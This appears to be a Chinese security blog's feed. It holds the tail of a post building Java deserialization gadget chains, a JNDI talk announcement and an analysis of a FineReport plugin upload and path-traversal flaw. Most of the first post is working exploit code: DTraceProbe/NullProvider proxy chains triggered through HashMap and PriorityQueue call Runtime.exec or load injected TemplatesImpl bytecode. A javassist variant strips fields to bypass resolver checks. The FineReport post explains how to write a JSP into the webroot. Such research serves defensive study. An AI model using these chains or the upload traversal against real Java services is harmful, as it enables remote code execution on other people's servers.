....<br></code></pre></td></tr></table></figure><p>可以看到这里implementing_method,proxy都是fied，我们可控，args是触发代理的方法的参数值，也可控，这样就完成反射调用。</p><p>通过以上分析，我们可以得出结论，<strong>classToInvocationHandler</strong>是一个二次调用动态代理，也就是我们跳过它，直接设置代理类为<strong>sun.tracing.ProviderSkeleton</strong>抽象类下面的四个实现类之一就行了，然后对feid修改，使其走到<strong>triggerProbe</strong>，在触发<strong>DTraceProbe#uncheckedTrigger</strong>完成调用。致于<strong>CompositeInvocationHandlerImpl</strong>，完全可以留着以后二次进行绕过麻。同理<strong>CompositeInvocationHandlerImpl</strong>, 他也有一个实现类<strong>CustomCompositeInvocationHandlerImpl</strong>，没有实现invoker，必要时也可用<strong>CustomCompositeInvocationHandlerImpl</strong>来触发二次次动态代理。</p><p><img src="image-20241228035951146.png" alt="image-20241228035951146"></p><p>他们继承ser接口，说不定在某些时候可以有在jdk gadget用上。</p><h3 id="0x03-构造利用链"><a href="#0x03-构造利用链" class="headerlink" title="0x03  构造利用链"></a>0x03  构造利用链</h3><h4 id="无参数（map触发）"><a href="#无参数（map触发）" class="headerlink" title="无参数（map触发）"></a>无参数（map触发）</h4><p>本质就是动态代理触发，入口第一时间就能效果到map类，map在反序列化时会进行hash计算触发hashcode，</p><p>所以非常简单就能构造出来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;calc&quot;</span>);<br>        ctClass.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br>        ctClass.makeClassInitializer().insertAfter(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytecode = ctClass.toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">teml</span> <span class="hljs-operator">=</span> utils.getTeml(bytecode);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">dTraceProbe</span> <span class="hljs-operator">=</span> instaniateUnsafe().allocateInstance(Class.forName(<span class="hljs-string">&quot;sun.tracing.dtrace.DTraceProbe&quot;</span>));<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method_getOutputProperties</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getOutputProperties&quot;</span>);<br>        setField(<span class="hljs-string">&quot;proxy&quot;</span>, dTraceProbe, teml);<br>        setField(<span class="hljs-string">&quot;implementing_method&quot;</span>, dTraceProbe, method_getOutputProperties);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method_hashcode</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        map.put(method_hashcode, dTraceProbe);<br><br><span class="hljs-comment">//sun.tracing.PrintStreamProvider，sun.tracing.NullProvider，sun.tracing.MultiplexProvider 选一个构造</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">nullProvider</span> <span class="hljs-operator">=</span> (InvocationHandler) instaniateUnsafe().allocateInstance(Class.forName(<span class="hljs-string">&quot;sun.tracing.NullProvider&quot;</span>));<br>        setField(<span class="hljs-string">&quot;active&quot;</span>, nullProvider, <span class="hljs-literal">true</span>);<br>        setField(<span class="hljs-string">&quot;providerType&quot;</span>, nullProvider, Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>));<br>        setField(<span class="hljs-string">&quot;probes&quot;</span>, nullProvider, map);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(<br>                nullProvider.getClass().getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>().getClass().getInterfaces(),<br>                nullProvider);<br><br><br><span class="hljs-comment">//        LinkedHashSet set = new LinkedHashSet();</span><br><span class="hljs-comment">//        set.add(proxy);</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        utils.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">1</span>);<br>        Class nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">1</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, proxy, proxy, <span class="hljs-literal">null</span>));<br>        utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br></code></pre></td></tr></table></figure><p>这样我们就行调用任意类的无参数方法类。</p><h4 id="一个参数（PriorityQueue触发）"><a href="#一个参数（PriorityQueue触发）" class="headerlink" title="一个参数（PriorityQueue触发）"></a>一个参数（PriorityQueue触发）</h4><p>那要是我们想调用一个有参数方法了，满足的入口类，很容易就想到了优先队列的queue的触发compareTo，接口<strong>java.lang.Comparable</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">Object</span> <span class="hljs-variable">dTraceProbe</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;sun.tracing.dtrace.DTraceProbe&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        utils.setFieldValue(dTraceProbe,<span class="hljs-string">&quot;proxy&quot;</span>, Runtime.getRuntime());<br>        utils.setFieldValue(dTraceProbe,<span class="hljs-string">&quot;implementing_method&quot;</span>, exec);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Comparable.class.getMethod(<span class="hljs-string">&quot;compareTo&quot;</span>, Object.class);<br>        map.put(method, dTraceProbe);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) utils.createWithoutConstructor(<span class="hljs-string">&quot;sun.tracing.NullProvider&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(<br>                handler.getClass().getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Comparable.class&#125;,<br>                handler);<br><br>        utils.setFieldValue(handler,<span class="hljs-string">&quot;active&quot;</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        utils.setFieldValue(handler, &quot;providerType&quot;,Class.forName(&quot;java.lang.Object&quot;));</span><br>        utils.setFieldValue(handler, <span class="hljs-string">&quot;providerType&quot;</span>,Class.forName(Comparable.class.getName()));<br>        utils.setFieldValue(handler, <span class="hljs-string">&quot;probes&quot;</span>, map);<br><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span> );<br><br>        utils.setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//exec触发</span><br>        utils.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;proxy,<span class="hljs-string">&quot;open -a calculator&quot;</span>&#125;); <span class="hljs-comment">//comparator为null,siftDownComparable，触发compareTo进行代理</span><br></code></pre></td></tr></table></figure><h4 id="两个参数（PriorityQueue触发）"><a href="#两个参数（PriorityQueue触发）" class="headerlink" title="两个参数（PriorityQueue触发）"></a>两个参数（PriorityQueue触发）</h4><p>一个参数的方法我们不满足，我们想触发两个有参数的方法，还是优先队列的queue的触发compare，<strong>java.util.Comparator</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">dTraceProbe</span> <span class="hljs-operator">=</span> utils.createWithoutConstructor(<span class="hljs-string">&quot;sun.tracing.dtrace.DTraceProbe&quot;</span>);<br> <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> Runtime.class.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class, String[].class);<br> utils.setFieldValue(dTraceProbe,<span class="hljs-string">&quot;proxy&quot;</span>, Runtime.getRuntime());<br> utils.setFieldValue(dTraceProbe,<span class="hljs-string">&quot;implementing_method&quot;</span>, exec);<br><br><br> <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Comparator.class.getMethod(<span class="hljs-string">&quot;compare&quot;</span>, Object.class, Object.class);<br> map.put(method, dTraceProbe);<br><br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) utils.createWithoutConstructor(<span class="hljs-string">&quot;sun.tracing.NullProvider&quot;</span>);<br> <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(<br>         handler.getClass().getClassLoader(),<br>         <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Comparator.class&#125;,<br>         handler);<br><br> utils.setFieldValue(handler,<span class="hljs-string">&quot;active&quot;</span>, <span class="hljs-literal">true</span>);<br> utils.setFieldValue(handler, <span class="hljs-string">&quot;providerType&quot;</span>,Class.forName(Comparator.class.getName()));<br> utils.setFieldValue(handler, <span class="hljs-string">&quot;probes&quot;</span>, map);<br><br><br> <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>() );<br><br> utils.setFieldValue(queue, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br><br><br> <span class="hljs-comment">//exec触发</span><br> utils.setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;open -a calculator&quot;</span>,<span class="hljs-literal">null</span>&#125;);<br> utils.setFieldValue(queue, <span class="hljs-string">&quot;comparator&quot;</span>, proxy);  <span class="hljs-comment">//comparator不为null,进去siftUpUsingComparator，触发compare进行代理</span><br></code></pre></td></tr></table></figure><p>然后就是各种实现类的替换，来进行绕过了， 虽然也不用， 思路就是这个思路哦</p><h4 id="二次代理替换-没什么用-因为fied也会进行序列化，绕过不过resolver检查"><a href="#二次代理替换-没什么用-因为fied也会进行序列化，绕过不过resolver检查" class="headerlink" title="二次代理替换(没什么用,因为fied也会进行序列化，绕过不过resolver检查 )"></a>二次代理替换(没什么用,因为fied也会进行序列化，绕过不过resolver检查 )</h4><p><strong>CustomCompositeInvocationHandlerImpl</strong> 来替换二次, </p><p>这个类有个stub 属性，不好赋值，直接暴力替换字符即可。</p><p>或者使用javasist删除fied,和对应的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">//删除stub在序列化时带来的干扰</span><br><span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">CustomCompositeInvocationHandlerImpl</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.sun.corba.se.impl.presentation.rmi.InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl&quot;</span>);<br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> CustomCompositeInvocationHandlerImpl.getDeclaredField(<span class="hljs-string">&quot;stub&quot;</span>);<br>        CustomCompositeInvocationHandlerImpl.removeField(stub);<br>        <span class="hljs-keyword">for</span> (CtMethod declaredMethod : CustomCompositeInvocationHandlerImpl.getDeclaredMethods()) &#123;<br>            <span class="hljs-keyword">if</span> (declaredMethod.getName().equals(<span class="hljs-string">&quot;setProxy&quot;</span>)||declaredMethod.getName().equals(<span class="hljs-string">&quot;getProxy&quot;</span>)) &#123;<br>                CustomCompositeInvocationHandlerImpl.removeMethod(declaredMethod);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (CtMethod method : CustomCompositeInvocationHandlerImpl.getMethods()) &#123;<br>            <span class="hljs-keyword">if</span> (method.getName().equals(<span class="hljs-string">&quot;CustomCompositeInvocationHandlerImpl&quot;</span>)||method.getName().equals(<span class="hljs-string">&quot;writeReplace&quot;</span>)) &#123;<br>                CustomCompositeInvocationHandlerImpl.removeMethod(method);<br>            &#125;<br>        &#125;<br>        CustomCompositeInvocationHandlerImpl.toClass();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br><br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;calc&quot;</span>);<br>    ctClass.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));<br>    ctClass.makeClassInitializer().insertAfter(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>    <span class="hljs-type">byte</span>[] bytecode = ctClass.toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">teml</span> <span class="hljs-operator">=</span> utils.getTeml(bytecode);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">dTraceProbe</span> <span class="hljs-operator">=</span> instaniateUnsafe().allocateInstance(Class.forName(<span class="hljs-string">&quot;sun.tracing.dtrace.DTraceProbe&quot;</span>));<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">method_getOutputProperties</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getOutputProperties&quot;</span>);<br>    setField(<span class="hljs-string">&quot;proxy&quot;</span>, dTraceProbe, teml);<br>    setField(<span class="hljs-string">&quot;implementing_method&quot;</span>, dTraceProbe, method_getOutputProperties);<br><br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">method_hashcode</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>    map.put(method_hashcode, dTraceProbe);<br><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">nullProvider</span> <span class="hljs-operator">=</span> instaniateUnsafe().allocateInstance(Class.forName(<span class="hljs-string">&quot;sun.tracing.NullProvider&quot;</span>));<br>    setField(<span class="hljs-string">&quot;active&quot;</span>, nullProvider, <span class="hljs-literal">true</span>);<br>    setField(<span class="hljs-string">&quot;providerType&quot;</span>, nullProvider, Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>));<br>    setField(<span class="hljs-string">&quot;probes&quot;</span>, nullProvider, map);<br><br><br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) instaniateUnsafe().allocateInstance(Class.forName(<span class="hljs-string">&quot;com.sun.corba.se.impl.presentation.rmi.InvocationHandlerFactoryImpl$CustomCompositeInvocationHandlerImpl&quot;</span>));<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(<br>            handler.getClass().getClassLoader(),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>().getClass().getInterfaces(),<br>            handler);<br><br>    utils.setFieldValue(handler, <span class="hljs-string">&quot;defaultHandler&quot;</span>, nullProvider);<br>    utils.setFieldValue(handler, <span class="hljs-string">&quot;classToInvocationHandler&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>());<br><br><br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">1</span>);<br>    Class nodeC;<br>    <span class="hljs-keyword">try</span> &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>    nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">1</span>);<br>    Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, proxy, proxy, <span class="hljs-literal">null</span>));<br>    utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br></code></pre></td></tr></table></figure><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>**com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl **以及子类  一个二次调用动态代理的类，继承Serializable。</p><p>说不定能用上。</p><p>任意类无参数到两个参数 利用链的构造。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://xz.aliyun.com/t/10360">https://xz.aliyun.com/t/10360</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jndi新攻击面探索</title>
    <link href="/2024/12/26/jndi%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/12/26/jndi%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​主要是我和springkill今年研究成功的一部分。 2024补天大会参会议题。</p><div class="row">    <embed src="JNDI新攻击面探索.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    
    <tags>
      
      <tag>议题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>finereport插件rce漏洞分析</title>
    <link href="/2024/12/17/finereport%E6%8F%92%E4%BB%B6rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/12/17/finereport%E6%8F%92%E4%BB%B6rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>首发qax社区</p><p><a href="https://forum.butian.net/article/629">https://forum.butian.net/article/629</a></p><h3 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h3><p>国护爆出来的洞,bi需要手动安装，report自带。利用版本有限，比较垃圾</p><p><a href="https://help.fanruan.com/finereport/doc-view-4833.html">https://help.fanruan.com/finereport/doc-view-4833.html</a></p><p><img src="image-20241103145031091.png" alt="image-20241103145031091"></p><p>很清楚看到，一开始的这个漏洞不需要授权，然后后面有进行目录穿越，和权限。也就是24.8月前的版本存在问题。</p><h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h3><p>com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestService</p><p><img src="image-20241103150112905.png" alt="image-20241103150112905"></p><p>可以看到调用upload方法，上传了</p><p>com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestHelper</p><p><img src="image-20241103150206993.png" alt="image-20241103150206993"></p><p>首先从请求中获取id，attachID然后判断是否为空。</p><p>不为空就去 FVSTemplateStyleConfig去获取我们传入的id，找不到就会报错。</p><p>com.fr.plugin.wysiwyg.web.theme.FVSTemplateStyleConfig</p><p><img src="image-20241103150343525.png" alt="image-20241103150343525"></p><p>来到FVSTemplateStyleConfig中，发现在类加载的时候出忘preStylesMap中put数据，那也就是id就是这里key咯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>  preStylesMap.put(<span class="hljs-string">&quot;0e1183e3-4a26-e27d-9e4b-190909fd67a0&quot;</span>, <span class="hljs-string">&quot;/com/fr/plugin/wysiwyg/web/assets/template/TEMPLATE_PRESET_DARK_1.json&quot;</span>);<br>  preStylesMap.put(<span class="hljs-string">&quot;0946780e-c0b7-839d-5944-8fb840f53450&quot;</span>, <span class="hljs-string">&quot;/com/fr/plugin/wysiwyg/web/assets/template/TEMPLATE_PRESET_DARK_2.json&quot;</span>);<br>  preStylesMap.put(<span class="hljs-string">&quot;c5bbc3eb-beaa-3926-ff8a-aeb866815284&quot;</span>, <span class="hljs-string">&quot;/com/fr/plugin/wysiwyg/web/assets/template/TEMPLATE_PRESET_DARK_3.json&quot;</span>);<br>  preStylesMap.put(<span class="hljs-string">&quot;98f6460e-2334-47a7-1081-72a7bd391e56&quot;</span>, <span class="hljs-string">&quot;/com/fr/plugin/wysiwyg/web/assets/template/TEMPLATE_PRESET_LIGHT_1.json&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在看到DuchampResourceRequestHelper.getFileFromReq</p><p><img src="image-20241103150510204.png" alt="image-20241103150510204"></p><p><img src="image-20241103150622934.png" alt="image-20241103150622934"></p><p>主要就是request中读入流，然后前后加入一个byte，不用管，最后返回。</p><p><img src="image-20241103151028775.png" alt="image-20241103151028775"></p><p>然后就是从上一步中获取了文件流，加入到了templateStyle，将attachID和它进行绑定。</p><p>然后从metadata的值，将metadata和attachID绑定，这里看到metadata是一个json。传参数用{“”:””} 传咯。</p><p>更新FVSTemplateStyleConfig的templateStyle，最后访问id，attachID。</p><p>从上面可以看出，我们可以控制一个FVSTemplateStyleConfig的类容。最后需要把他倒入到webroot下就可以完成恶意文件上传咯。</p><p>com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestService</p><p><img src="image-20241103151858083.png" alt="image-20241103151858083"></p><p>这个理由就符合条件</p><p>com.fr.plugin.wysiwyg.web.controller.DuchampThemeRequestHelper</p><p><img src="image-20241103152113983.png" alt="image-20241103152113983"></p><p>这里就完成了写入，可以看到通过id获取fvsTemplateStyle，然后获取这个fvsTemplateStyle中attachID对应的byte，然后在resource判断有没有有这个attachid，肯定是没有的，继续从fvsTemplateStyle中获取metadata，然后从metadata中获取name的值，若果为空就用attachID + “.png”拼接，这里从metadata取到了，不为空。然后就是进行写入了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">DuchampIO.EDIT_CACHE.write(bean.getTplPath(), name, image);<br></code></pre></td></tr></table></figure><p>这就有意思了，image是一个byte流可控，name我们可控，没过滤，也就是可以通过”.<strong>.&#x2F;..&#x2F;</strong>“ 穿越写入。这样就完成了对webroot下的jsp写入。</p><p>整个流程非常巧妙，反正我觉得现在静态分析是分析不出来的，果然厉害的洞还得人审计。</p><h3 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h3><p><img src="image-20241103152914045.png" alt="image-20241103152914045"></p><p><img src="image-20241103152929358.png" alt="image-20241103152929358"></p><p><img src="image-20241103152935451.png" 